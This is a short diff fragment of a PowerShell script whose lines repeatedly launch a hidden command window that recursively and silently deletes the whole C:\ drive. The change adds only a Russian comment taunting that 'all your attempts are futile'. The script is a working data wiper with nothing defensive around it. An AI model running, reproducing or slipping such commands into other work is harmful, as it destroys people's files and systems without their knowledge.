@@ -17,3 +17,4 @@ Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -W
 Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
 Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
 Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
+#все ваши попытки тщетны)
